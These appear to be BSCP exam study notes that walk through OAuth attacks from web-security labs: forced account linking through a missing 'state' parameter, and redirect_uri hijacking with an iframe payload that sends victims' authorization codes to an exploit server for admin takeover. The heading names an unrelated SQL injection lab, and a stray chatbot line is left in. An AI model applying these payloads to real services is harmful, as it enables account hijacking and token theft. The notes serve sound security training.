 ## Lab: Blind SQL injection with conditional responses
 
 
 ### **Forced Authentication Linking to Get Admin Access**  

- Gain admin access by exploiting the absence of the `state` parameter in OAuth linking.  
- Find the linking code and send it to the victim using an exploit server.  

#### **Steps to Execute the Attack:**  

1. **Find the Authentication Linking Code**  
   - Capture the linking request but **do not log out** of your account.  

2. **Send the Exploit to the Victim**  
   - Use an iframe to send the linking request:  
     ```html
     <iframe src="<auth_link>"></iframe>
     ```
   - Wait for the victim to click the link.  

3. **Complete the Exploit**  
   - Log out of your account.  
   - Log in again using "Log in with Social Media" to gain access to the victim’s linked account.  



Here's a more concise version of your notes for the BSCP exam:

---

### **OAuth Redirect URI Hijacking (Exploiting OAuth Flow)**

**Objective:**  
Hijack the `redirect_uri` in OAuth flow to steal the authorization code, gain unauthorized access, and potentially escalate privileges (e.g., admin access).

---

### **Steps to Exploit OAuth Flow:**

1. **Intercept OAuth Request**  
   - Use **Burp Suite** to capture the client request containing `client_id` and `redirect_uri`.

2. **Modify the `redirect_uri`**  
   - Change the `redirect_uri` to your **exploit server** URL (e.g., `https://exploit-server.net`).

   **Example payload:**
   ```html
   <iframe src="https://oauth-server.net/auth?client_id=<client_id>&redirect_uri=https%3A%2F%2Fexploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
   ```

3. **Send the Malicious Link to Victim**  
   - Deliver the modified URL to the victim (via phishing or XSS).  
   - When the victim logs in, the **authorization code** is sent to your exploit server.

4. **Capture the Authorization Code**  
   - Check the **exploit server logs** for the stolen **authorization code**.

5. **Use the Authorization Code**  
   - Exchange the stolen authorization code for an **access token** via the OAuth callback (`/oauth/callback`).

6. **Gain Admin Access**  
   - If targeting an admin account, use the **stolen access token** to gain admin access and perform privileged actions (e.g., delete users).

---